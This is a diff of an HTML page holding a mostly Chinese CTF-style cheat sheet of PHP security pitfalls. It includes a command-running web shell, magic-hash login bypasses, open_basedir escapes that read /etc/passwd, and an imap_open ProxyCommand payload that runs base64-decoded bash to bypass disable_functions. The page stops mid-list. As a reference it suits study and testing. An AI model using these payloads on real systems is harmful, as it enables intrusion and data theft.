@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Web_Application_Attack/Misc.html">Web Application Attack</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Web_Application_Attack/PHP_Feature_in_Security.html">PHP Feature in Security</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 1:01 AM        </span>
+            February 16, 2021 at 1:02 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/120_Web_Application_Attack/040_PHP_Feature_in_Security.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,1255 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_PHP_Feature_in_security">PHP Feature in security</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_PHP_Feature_in_security">PHP Feature in security</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Web</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Online_Resources">Online Resources</a></p>
+</li>
+<li>
+<p><a href="#page_Shell">Shell</a></p>
+</li>
+<li>
+<p><a href="#page_Other">Other</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_ben_de_ce_shi">本地測試</a></p>
+</li>
+<li>
+<p><a href="#page_Thought_of_finding_bugs">Thought of finding bugs</a></p>
+</li>
+<li>
+<p><a href="#page_PHP_Tag">PHP Tag</a></p>
+</li>
+<li>
+<p><a href="#page_PHP_Weak_Type">PHP Weak Type</a></p>
+</li>
+<li>
+<p><a href="#page_PHP_qi_ta_te_xing">PHP 其他特性</a></p>
+</li>
+<li>
+<p><a href="#page_Overflow">Overflow</a></p>
+</li>
+<li>
+<p><a href="#page_fu_dian_shu_jing_du">浮點數精度</a></p>
+</li>
+<li>
+<p><a href="#page_ereg_hui_beiNULL_jie_duan">ereg會被NULL截斷</a></p>
+</li>
+<li>
+<p><a href="#page_intval">intval</a></p>
+</li>
+<li>
+<p><a href="#page_extract_bian_shu_fu_gai">extract變數覆蓋</a></p>
+</li>
+<li>
+<p><a href="#page_trim">trim</a></p>
+</li>
+<li>
+<p><a href="#page_is_numeric">is_numeric</a></p>
+</li>
+<li>
+<p><a href="#page_in_array">in_array</a></p>
+</li>
+<li>
+<p><a href="#page_array_search">array_search</a></p>
+</li>
+<li>
+<p><a href="#page_parse_str">parse_str</a></p>
+</li>
+<li>
+<p><a href="#page_parse_url">parse_url</a></p>
+</li>
+<li>
+<p><a href="#page_preg_replace">preg_replace</a></p>
+</li>
+<li>
+<p><a href="#page_sprintf_vprintf">sprintf / vprintf</a></p>
+</li>
+<li>
+<p><a href="#page_file_put_contents">file_put_contents</a></p>
+</li>
+<li>
+<p><a href="#page_spl_autoload_register">spl_autoload_register</a></p>
+</li>
+<li>
+<p><a href="#page_lu_jing_zheng_gui_hua">路徑正規化</a></p>
+</li>
+<li>
+<p><a href="#page_URL_query_decode">URL query decode</a></p>
+</li>
+<li>
+<p><a href="#page_OPcache">OPcache</a></p>
+</li>
+<li>
+<p><a href="#page_PCRE_hui_su_ci_shu_xian_zhi_rao_guo">PCRE回溯次數限制繞過</a></p>
+</li>
+<li>
+<p><a href="#page_open_basedir_rao_guo">open_basedir繞過</a></p>
+</li>
+<li>
+<p><a href="#page_disable_functions_rao_guo">disable_functions繞過</a></p>
+</li>
+<li>
+<p><a href="#page_qi_ta">其他</a></p>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>Web</code></h6>
+<h1 id="page_Online_Resources">Online Resources</h1>
+<p><a href="https://ithelp.ithome.com.tw/articles/10219775" class="Link--external" rel="noopener noreferrer">Web Security 魔法使攻略─PHP 是世界上最好的語言
+</a></p>
+<h1 id="page_Shell">Shell</h1>
+<pre><code>cmd=ls -la&amp;html=&lt;?php if(isset($_REQUEST['cmd'])){ echo &quot;&lt;pre&gt;&quot;; $cmd = ($_REQUEST['cmd']); system($cmd); echo &quot;&lt;/pre&gt;&quot;; die; }
+html=&lt;?php system(&quot;ls -la&quot;); ?&gt;
+</code></pre>
+<h1 id="page_Other">Other</h1>
+<h2 id="page_ben_de_ce_shi">本地測試</h2>
+<pre><code>php &gt; var_dump(&quot;30cm&quot; == 30);
+bool(true)
+</code></pre>
+<p><img src="https://i.imgur.com/1KnmGln.png" alt="" /></p>
+<h2 id="page_Thought_of_finding_bugs">Thought of finding bugs</h2>
+<ul>
+<li>input
+<ul>
+<li>$_GET / $_POST / $_REQUEST</li>
+<li>$_COOKIE / $_SESSION</li>
+<li>$_SERVER</li>
+<li>$_FILES</li>
+<li>$_ENV</li>
+</ul>
+</li>
+<li>Dangerous functions
+<ul>
+<li>system</li>
+<li>shell_exec / exec</li>
+<li>popen / proc_open</li>
+<li>assert</li>
+<li>passthru</li>
+<li>create_function</li>
+<li>*_replace</li>
+<li>include / include_once</li>
+<li>requre / require_once</li>
+<li>eval (not a function)</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_PHP_Tag">PHP Tag</h2>
+<ul>
+<li>
+<code>&lt;? ?&gt;</code>
+<ul>
+<li>short_open_tag 決定是否可使用短標記</li>
+<li>或是編譯php時 –enable-short-tags</li>
+</ul>
+</li>
+<li>
+<code>&lt;?=</code>
+<ul>
+<li>等價 <code>&lt;? echo</code>
+</li>
+<li>自<code>PHP 5.4.0</code>起，always work!</li>
+</ul>
+</li>
+<li>
+<code>&lt;% %&gt;</code>、<code>&lt;%=</code>
+<ul>
+<li>自<code>PHP 7.0.0</code>起，被移除</li>
+<li>須將<code>asp_tags</code>設成On</li>
+</ul>
+</li>
+<li>
+<code>&lt;script language=&quot;php&quot;</code>
+<ul>
+<li>自<code>PHP 7.0.0</code>起，被移除</li>
+<li>
+<code>&lt;script language=&quot;php&quot;&gt;system(&quot;id&quot;); &lt;/script&gt;</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_PHP_Weak_Type">PHP Weak Type</h2>
+<ul>
+<li>
+<p><code>var_dump('0xABCdef' == '0xABCdef');</code></p>
+<ul>
+<li>true           (Output for hhvm-3.18.5 - 3.22.0, 7.0.0 - 7.2.0rc4: false)</li>
+</ul>
+</li>
+<li>
+<p><code>var_dump('0010e2' == '1e3’);</code></p>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<p><code>strcmp([],[]) == NULL</code></p>
+</li>
+<li>
+<p><code>strlen([]) == NULL</code></p>
+</li>
+<li>
+<p><code>sha1([])</code></p>
+<ul>
+<li>NULL</li>
+</ul>
+</li>
+<li>
+<p><code>'123' == 123</code></p>
+</li>
+<li>
+<p><code>'abc' == 0</code></p>
+</li>
+<li>
+<p><code>'123a' == 123</code></p>
+</li>
+<li>
+<p><code>'0x01' == 1</code></p>
+<ul>
+<li>PHP 7.0後，16進位字串不再當成數字</li>
+<li>e.g <code>var_dump('0x01' == 1)</code> =&gt; false</li>
+</ul>
+</li>
+<li>
+<p><code>'' == 0 == false == NULL</code></p>
+</li>
+<li>
+<p><code>md5([1,2,3]) == md5([4,5,6]) == NULL</code></p>
+<ul>
+<li>可用在登入繞過 (用戶不存在，則password為NULL)</li>
+</ul>
+</li>
+<li>
+<p><code>var_dump(md5(240610708));</code></p>
+<ul>
+<li>0e462097431906509019562988736854</li>
+</ul>
+</li>
+<li>
+<p><code>var_dump(sha1(10932435112));</code></p>
+<ul>
+<li>0e07766915004133176347055865026311692244</li>
+</ul>
+</li>
+<li>
+<p><code>$a=&quot;123&quot;; $b=&quot;456&quot;</code></p>
+<ul>
+<li>
+<code>$a + $b == &quot;579&quot;;</code>
+</li>
+<li>
+<code>$a . $b == &quot;123456&quot;</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>$a = 0; $b = 'x';</code></p>
+<ul>
+<li>
+<code>$a == false</code> =&gt; true</li>
+<li>
+<code>$a == $b</code> =&gt; true</li>
+<li>
+<code>$b == true</code> =&gt; true</li>
+</ul>
+</li>
+<li>
+<p><code>$a = 'a'</code></p>
+<ul>
+<li>
+<code>++$a</code> =&gt; <code>'b'</code>
+</li>
+<li>
+<code>$a+1</code> =&gt; <code>1</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_PHP_qi_ta_te_xing">PHP 其他特性</h2>
+<h2 id="page_Overflow">Overflow</h2>
+<ul>
+<li>32位元
+<ul>
+<li>
+<code>intval('1000000000000')</code> =&gt; <code>2147483647</code>
+</li>
+</ul>
+</li>
+<li>64位元
+<ul>
+<li>
+<code>intval('100000000000000000000')</code> =&gt; <code>9223372036854775807</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_fu_dian_shu_jing_du">浮點數精度</h2>
+<ul>
+<li>
+<p><code>php -r &quot;var_dump(1.000000000000001 == 1);&quot;</code></p>
+<ul>
+<li>false</li>
+</ul>
+</li>
+<li>
+<p><code>php -r &quot;var_dump(1.0000000000000001 == 1);&quot;</code></p>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<p><code>$a = 0.1 * 0.1; var_dump($a == 0.01);</code></p>
+<ul>
+<li>false</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_ereg_hui_beiNULL_jie_duan">ereg會被NULL截斷</h2>
+<ul>
+<li>
+<code>var_dump(ereg(&quot;^[a-zA-Z0-9]+$&quot;, &quot;1234\x00-!@#%&quot;));</code>
+<ul>
+<li>
+<code>1</code>
+</li>
+</ul>
+</li>
+<li>
+<code>ereg</code>和<code>eregi</code>在PHP 7.0.0.已經被移除</li>
+</ul>
+<h2 id="page_intval">intval</h2>
+<ul>
+<li>四捨五入
+<ul>
+<li>
+<code>var_dump(intval('5278.8787'));</code>
+<ul>
+<li>
+<code>5278</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<code>intval(012)</code> =&gt; 10</li>
+<li>
+<code>intval(&quot;012&quot;)</code> =&gt; 12</li>
+</ul>
+<h2 id="page_extract_bian_shu_fu_gai">extract變數覆蓋</h2>
+<ul>
+<li>
+<code>extract($_GET);</code>
+<ul>
+<li>
+<code>.php?_SESSION[name]=admin</code>
+</li>
+<li>
+<code>echo $_SESSION['name']</code> =&gt; ‘admin’</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_trim">trim</h2>
+<ul>
+<li>會把字串前後的空白(或其他字元)去掉</li>
+<li>未指定第二參數，預設會去掉以下字元
+<ul>
+<li>
+<code>&quot; &quot;</code> (0x20)</li>
+<li>
+<code>&quot;\t&quot;</code> (0x09)</li>
+<li>
+<code>&quot;\n&quot;</code> (0x0A)</li>
+<li>
+<code>&quot;\x0B&quot;</code> (0x0B)</li>
+<li>
+<code>&quot;\r&quot;</code> (0x0D)</li>
+<li>
+<code>&quot;\0&quot;</code> (0x00)</li>
+</ul>
+</li>
+<li>可以發現預設不包含<code>&quot;\f&quot;</code> (0x0C)
+<ul>
+<li>比較：is_numeric()允許<code>\f</code>在開頭</li>
+</ul>
+</li>
+<li>如果參數是unset或空的變數，回傳值是空字串</li>
+</ul>
+<h2 id="page_is_numeric">is_numeric</h2>
+<ul>
+<li>
+<p><code>is_numeric(&quot; \t\r\n 123&quot;)</code> =&gt; <code>true</code></p>
+</li>
+<li>
+<p><code>is_numeric(' 87')</code> =&gt; <code>true</code></p>
+</li>
+<li>
+<p><code>is_numeric('87 ')</code> =&gt; <code>false</code></p>
+</li>
+<li>
+<p><code>is_numeric(' 87 ')</code> =&gt; <code>false</code></p>
+</li>
+<li>
+<p><code>is_numeric('0xdeadbeef')</code></p>
+<ul>
+<li>PHP &gt;= 7.0.0 =&gt; <code>false</code>
+</li>
+<li>PHP &lt; 7.0.0 =&gt; <code>true</code>
+</li>
+<li>可以拿來繞過注入</li>
+</ul>
+</li>
+<li>
+<p>以下亦為合法(返回True)字串:</p>
+<ul>
+<li>
+<code>' -.0'</code>
+</li>
+<li>
+<code>'0.'</code>
+</li>
+<li>
+<code>' +2.1e5'</code>
+</li>
+<li>
+<code>' -1.5E+25'</code>
+</li>
+<li>
+<code>'1.e5'</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_in_array">in_array</h2>
+<ul>
+<li>
+<code>in_array('5 or 1=1', array(1, 2, 3, 4, 5))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array('kaibro', array(0, 1, 2))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array(array(), array('kai'=&gt;false))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array(array(), array('kai'=&gt;null))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array(array(), array('kai'=&gt;0))</code>
+<ul>
+<li>false</li>
+</ul>
+</li>
+<li>
+<code>in_array(array(), array('kai'=&gt;'bro'))</code>
+<ul>
+<li>false</li>
+</ul>
+</li>
+<li>
+<code>in_array('kai', array('kai'=&gt;true))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array('kai', array('kai'=&gt;'bro'))</code>
+<ul>
+<li>false</li>
+</ul>
+</li>
+<li>
+<code>in_array('kai', array('kai'=&gt;0))</code>
+<ul>
+<li>true</li>
+</ul>
+</li>
+<li>
+<code>in_array('kai', array('kai'=&gt;1))</code>
+<ul>
+<li>false</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_array_search">array_search</h2>
+<ul>
+<li>
+<code>mixed array_search(mixed $needle , array $haystack [, bool $strict = false ])</code>
+<ul>
+<li>在<code>haystack</code>陣列中，搜尋<code>needle</code>的值，成功則返回index，失敗返回False</li>
+</ul>
+</li>
+<li>
+<code>$strict</code>為false時，採用不嚴格比較
+<ul>
+<li>預設是False</li>
+</ul>
+</li>
+<li>Example
+<ul>
+<li>
+<code>$arr=array(1,2,0); var_dump(array_search('kai', $arr))</code>
+<ul>
+<li>
+<code>int(2)</code>
+</li>
+</ul>
+</li>
+<li>
+<code>$arr=array(1,2,0); var_dump(array_search('1', $arr))</code>
+<ul>
+<li>
+<code>int(0)</code>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_parse_str">parse_str</h2>
+<ul>
+<li>
+<p><code>parse_str(string, array)</code></p>
+</li>
+<li>
+<p>會把查詢字串解析到變數中</p>
+</li>
+<li>
+<p>如果未設置第二個參數，會解析到同名變數中</p>
+<ul>
+<li>PHP7.2中不設置第二個參數會產生<code>E_DEPRECATED</code>警告</li>
+</ul>
+</li>
+<li>
+<p><code>parse_str('gg[kaibro]=5566');</code></p>
+<pre><code>array(1) {
+  [&quot;kaibro&quot;]=&gt;
+    string(4) &quot;5566&quot;
+}
+
+</code></pre>
+</li>
+<li>
+<p>PHP變數有空格和.，會被轉成底線</p>
+<pre><code>parse_str(&quot;na.me=kaibro&amp;pass wd=ggininder&quot;,$test);
+var_dump($test);
+
+array(2) { 
+    [&quot;na_me&quot;]=&gt; string(6) &quot;kaibro&quot; 
+    [&quot;pass_wd&quot;]=&gt; string(9) &quot;ggininder&quot; 
+} 
+</code></pre>
+</li>
+</ul>
+<h2 id="page_parse_url">parse_url</h2>
+<ul>
+<li>
+<p>在處理傳入的URL會有問題</p>
+</li>
+<li>
+<p><code>parse_url('/a.php?id=1')</code></p>
+<pre><code>array(2) {
+  [&quot;host&quot;]=&gt;
+    string(5) &quot;a.php&quot;
+  [&quot;query&quot;]=&gt;
+    string(4) &quot;id=1&quot;
+}
+</code></pre>
+</li>
+<li>
+<p><code>parse_url('//a/b')</code></p>
+<ul>
+<li>host: <code>a</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>parse_url('..//a/b/c:80')</code></p>
+<ul>
+<li>host: <code>..</code>
+</li>
+<li>port: <code>80</code>
+</li>
+<li>path: <code>//a/b/c:80</code>
+</li>
+</ul>
+</li>
+<li>
+<p><code>parse_url('///a.php?id=1')</code></p>
+<ul>
+<li>false</li>
+</ul>
+</li>
+<li>
+<p><code>parse_url('/a.php?id=1:80')</code></p>
+<ul>
+<li>PHP &lt; 7.0.0
+<ul>
+<li>
+<code>false</code>
+</li>
+</ul>
+</li>
+<li>PHP &gt;= 7.0.0
+<pre><code>  array(2) { 
+      [&quot;path&quot;]=&gt; string(6) &quot;/a.php&quot; 
+      [&quot;query&quot;]=&gt; string(7) &quot;id=1:80&quot; 
+  }
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><code>parse_url('http://kaibro.tw:87878')</code></p>
+<ul>
+<li>5.3.X版本以下
+<pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) { 
+    [<span class="hljs-string">"scheme"</span>]=&gt; string(<span class="hljs-number">4</span>) <span class="hljs-string">"http"</span> 
+    [<span class="hljs-string">"host"</span>]=&gt; string(<span class="hljs-number">9</span>) <span class="hljs-string">"kaibro.tw"</span> 
+    [<span class="hljs-string">"port"</span>]=&gt; int(<span class="hljs-number">22342</span>) 
+}
+</code></pre>
+</li>
+<li>其他： false</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_preg_replace">preg_replace</h2>
+<ul>
+<li>
+<code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code>
+<ul>
+<li>搜尋<code>$subject</code>中匹配的<code>$pattern</code>，並用<code>$replacement</code>替換</li>
+</ul>
+</li>
+<li>第一個參數用<code>/e</code>修飾符，<code>$replacement</code>會被當成PHP code執行
+<ul>
+<li>必須有匹配到才會執行</li>
+<li>PHP 5.5.0起，會產生<code>E_DEPRECATED</code>錯誤</li>
+<li>PHP 7.0.0不再支援，用<code>preg_replace_callback()</code>代替</li>
+</ul>
+</li>
+</ul>
+<p>example:</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$a=<span class="hljs-string">'phpkaibro'</span>;
+<span class="hljs-keyword">echo</span> preg_replace(<span class="hljs-string">'/(.*)kaibro/e'</span>,<span class="hljs-string">'\\1info()'</span>,$a);
+</code></pre>
+<h2 id="page_sprintf_vprintf">sprintf / vprintf</h2>
+<ul>
+<li>對格式化字串的類型沒檢查</li>
+<li>格式化字串中%後面的字元(除了%之外)會被當成字串類型吃掉
+<ul>
+<li>例如<code>%\</code>、<code>%'</code>、<code>%1$\'</code>
+</li>
+<li>在某些SQLi過濾狀況下，<code>%' and 1=1#</code>中的單引號會被轉義成<code>\'</code>，<code>%\</code>又會被吃掉，<code>'</code>成功逃逸</li>
+<li>原理：sprintf實作是用switch…case…
+<ul>
+<li>碰到未知類型，<code>default</code>不處理</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_file_put_contents">file_put_contents</h2>
+<ul>
+<li>第二個參數如果是陣列，PHP會把它串接成字串</li>
+<li>example:
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$test = $_GET[<span class="hljs-string">'txt'</span>];
+<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'[&lt;&gt;?]'</span>, $test)) <span class="hljs-keyword">die</span>(<span class="hljs-string">'bye'</span>);
+file_put_contents(<span class="hljs-string">'output'</span>, $test);
+</code></pre>
+<ul>
+<li>可以直接<code>?txt[]=&lt;?php phpinfo(); ?&gt;</code>寫入</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_spl_autoload_register">spl_autoload_register</h2>
+<ul>
+<li>
+<code>spl_autoload_register()</code>可以自動載入Class</li>
+<li>不指定參數，會自動載入<code>.inc</code>和<code>.php</code>
+</li>
+<li>Example:
+<ul>
+<li>如果目錄下有kaibro.inc，且內容為class Kaibro{…}</li>
+<li>則<code>spl_autoload_register()</code>會把這個Class載入進來</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_lu_jing_zheng_gui_hua">路徑正規化</h2>
+<ul>
+<li>
+<code>a.php/.</code>
+<ul>
+<li>
+<code>file_put_contents(&quot;a.php/.&quot;, &quot;&lt;?php phpinfo() ?&gt;&quot;);</code>
+<ul>
+<li>可成功寫入
+<ul>
+<li>經測試Windows可以覆寫、Linux無法</li>
+</ul>
+</li>
+<li>可以繞過一些正規表達式判斷</li>
+</ul>
+</li>
+<li>
+<code>file_get_contents(&quot;a.php/.&quot;);</code>
+<ul>
+<li>經測試Windows下可成功讀、Linux無法</li>
+</ul>
+</li>
+<li>還有很多其他function也適用</li>
+</ul>
+</li>
+<li>
+<code>&quot;</code> =&gt; <code>.</code>
+<ul>
+<li>
+<code>a&quot;php</code>
+</li>
+</ul>
+</li>
+<li>
+<code>&gt;</code> =&gt; <code>?</code>
+<ul>
+<li>
+<code>a.p&gt;p</code>
+</li>
+<li>
+<code>a.&gt;&gt;&gt;</code>
+</li>
+</ul>
+</li>
+<li>
+<code>&lt;</code> =&gt; <code>*</code>
+<ul>
+<li>
+<code>a.&lt;</code>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_URL_query_decode">URL query decode</h2>
+<ul>
+<li>
+<code>$_GET</code>會對傳入的參數做URLdecode再返回</li>
+<li>
+<code>$_SERVER['REQUEST_URI']</code>和<code>$_SERVER['QUERY_STRING']</code>則是直接返回</li>
+</ul>
+<p>Example:</p>
+<p>Request: <code>http://kaibro.tw/test.php?url=%67%67</code></p>
+<ul>
+<li>
+<p>$_GET: <code>[url] =&gt; gg</code></p>
+</li>
+<li>
+<p>$_SERVER[‘REQUEST_URI’]: <code>/test.php?url=%67%67</code></p>
+</li>
+<li>
+<p>$_SERVER[‘QUERY_STRING’]: <code>url=%67%67</code></p>
+</li>
+</ul>
+<h2 id="page_OPcache">OPcache</h2>
+<ul>
+<li>透過將PHP腳本編譯成Byte code的方式做Cache來提升性能</li>
+<li>相關設定在php.ini中
+<ul>
+<li>
+<code>opcache.enable</code> 是否啟用</li>
+<li>
+<code>opcache.file_cache</code> 設定cache目錄
+<ul>
+<li>例如:<code>opcache.file_cache=&quot;/tmp/opcache&quot;</code>
+</li>
+<li>
+<code>/var/www/index.php</code>的暫存會放在<code>/tmp/opcache/[system_id]/var/www/index.php.bin</code>
+</li>
+</ul>
+</li>
+<li>
+<code>opcache.file_cache_only</code> 設定cache文件優先級</li>
+<li>
+<code>opcache.validate_timestamps</code> 是否啟用timestamp驗證</li>
+</ul>
+</li>
+<li>
+<code>system_id</code>是透過Zend和PHP版本號計算出來的，可以確保相容性</li>
+<li>所以在某些條件下可透過上傳覆蓋暫存文件來寫webshell
+<ul>
+<li>system_id要和目標機器一樣</li>
+<li>timestamp要一致</li>
+</ul>
+</li>
+<li>https://github.com/GoSecure/php7-opcache-override
+<ul>
+<li>Disassembler可以把Byte code轉成Pseudo code</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_PCRE_hui_su_ci_shu_xian_zhi_rao_guo">PCRE回溯次數限制繞過</h2>
+<ul>
+<li>PHP的PCRE庫使用NFA作為正規表達式引擎
+<ul>
+<li>NFA在匹配不上時，會回溯嘗試其他狀態</li>
+</ul>
+</li>
+<li>PHP為防止DOS，設定了PCRE回溯次數上限
+<ul>
+<li>
+<code>pcre.backtrack_limit</code>
+</li>
+<li>預設為<code>1000000</code>
+</li>
+</ul>
+</li>
+<li>回溯次數超過上限時，<code>preg_match()</code>會返回<code>false</code>
+</li>
+<li>Example
+<ul>
+<li>Code-Breaking Puzzles - pcrewaf</li>
+</ul>
+</li>
+</ul>
+<h2 id="page_open_basedir_rao_guo">open_basedir繞過</h2>
+<ul>
+<li>glob 列目錄</li>
+</ul>
+<pre><code class="hljs php">$file_list = <span class="hljs-keyword">array</span>();
+$it = <span class="hljs-keyword">new</span> DirectoryIterator(<span class="hljs-string">"glob:///*"</span>);
+<span class="hljs-keyword">foreach</span>($it <span class="hljs-keyword">as</span> $f) {  
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);  
+<span class="hljs-keyword">foreach</span>($file_list <span class="hljs-keyword">as</span> $f){  
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"{$f}&lt;br/&gt;"</span>;
+}
+</code></pre>
+<ul>
+<li>
+<a href="https://twitter.com/Blaklis_/status/1111586655134203904" class="Link--external" rel="noopener noreferrer">phuck3</a>
+</li>
+</ul>
+<pre><code class="hljs php">chdir(<span class="hljs-string">'img'</span>);
+ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);chdir(<span class="hljs-string">'..'</span>);
+ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);
+<span class="hljs-keyword">echo</span>(file_get_contents(<span class="hljs-string">'flag'</span>));
+</code></pre>
+<ul>
+<li>symlinks</li>
+</ul>
+<pre><code class="hljs php">mkdir(<span class="hljs-string">'/var/www/html/a/b/c/d/e/f/g/'</span>,<span class="hljs-number">0777</span>,<span class="hljs-keyword">TRUE</span>);
+symlink(<span class="hljs-string">'/var/www/html/a/b/c/d/e/f/g'</span>,<span class="hljs-string">'foo'</span>);
+ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/var/www/html:bar/'</span>);
+symlink(<span class="hljs-string">'foo/../../../../../../'</span>,<span class="hljs-string">'bar'</span>);
+unlink(<span class="hljs-string">'foo'</span>);
+symlink(<span class="hljs-string">'/var/www/html/'</span>,<span class="hljs-string">'foo'</span>);
+<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">'bar/etc/passwd'</span>);
+</code></pre>
+<ul>
+<li>
+<p>Fastcgi</p>
+<ul>
+<li>
+<a href="https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy" class="Link--external" rel="noopener noreferrer">link</a>
+</li>
+</ul>
+</li>
+<li>
+<p>…</p>
+</li>
+</ul>
+<h2 id="page_disable_functions_rao_guo">disable_functions繞過</h2>
+<ul>
+<li>
+<p>bash shellshock</p>
+</li>
+<li>
+<p>mail()</p>
+<ul>
+<li>
+<code>sendmail</code>
+</li>
+<li>putenv寫LD_PRELOAD</li>
+<li>trick: <a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" class="Link--external" rel="noopener noreferrer">LD_PRELOAD without sendmail/getuid()</a>
+</li>
+</ul>
+</li>
+<li>
+<p>imap_open()</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$payload = <span class="hljs-string">"echo hello|tee /tmp/executed"</span>;
+$encoded_payload = base64_encode($payload);
+$server = <span class="hljs-string">"any -o ProxyCommand=echo\t"</span>.$encoded_payload.<span class="hljs-string">"|base64\t-d|bash"</span>;
+@imap_open(<span class="hljs-string">'{'</span>.$server.<span class="hljs-string">'}:143/imap}INBOX'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">''</span>);
+</code></pre>
+</li>
+<li>
+<p>error_log()</p>
+<ul>
+<li>第二個參數<code>message_type</code>為1時，會去調用sendmail</li>
+</ul>
+</li>
+<li>
+<p>ImageMagick</p>
+<ul>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/39766" class="Link--external" rel="noopener noreferrer">Command Injection</a></p>
+</li>
+<li>
+<p>LD_PRELOAD + ghostscript:</p>
+<ul>
+<li>Imagemagick會用ghostscript去parse <code>eps</code>
+</li>
+<li>
+<a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#solution-2:-bypass-disable_function-with-ld_preload" class="Link--external" rel="noopener noreferrer">Link</a>
+</li>
+</ul>
+</li>
+<li>
+<p>LD_PRELOAD + ffpmeg</p>
+<ul>
+<li>
+<a href="https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/" class="Link--external" rel="noopener noreferrer">Link</a>
+</li>
+</ul>
+</li>
+<li>
+<p>MAGICK_CODER_MODULE_PATH</p>
+<ul>
+<li>
+<blockquote>
+<p>it can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory</p>
+</blockquote>
+</li>
+<li>
+<a href="https://www.imagemagick.org/script/resources.php#Environment%20Variables" class="Link--external" rel="noopener noreferrer">Document</a>
+</li>
+<li>
+<a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy" class="Link--external" rel="noopener noreferrer">Link</a>
+</li>
+</ul>
+</li>
+<li>
+<p>MAGICK_CONFIGURE_PATH</p>
+<ul>
+<li>
+<code>delegates.xml</code>定義處理各種文件的規則</li>
+<li>可以用putenv寫掉設定檔路徑</li>
+<li>
+<a href="https://xz.aliyun.com/t/4688#toc-14" class="Link--external" rel="noopener noreferrer">Link</a>
+</li>
+</ul>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">delegatemap</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">delegate</span> <span class="hljs-attr">decode</span>=<span class="hljs-string">"ps:alpha"</span> <span class="hljs-attr">command</span>=<span class="hljs-string">"sh -c <span class="hljs-symbol">&amp;quot;</span>/readflag &gt; /tmp/output<span class="hljs-symbol">&amp;quot;</span>"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">delegatemap</span>&gt;</span>
+</code></pre>
+</li>
+<li>
+<p>蓋<code>PATH</code> + ghostscript:</p>
+<ul>
+<li>造一個執行檔gs</li>
+</ul>
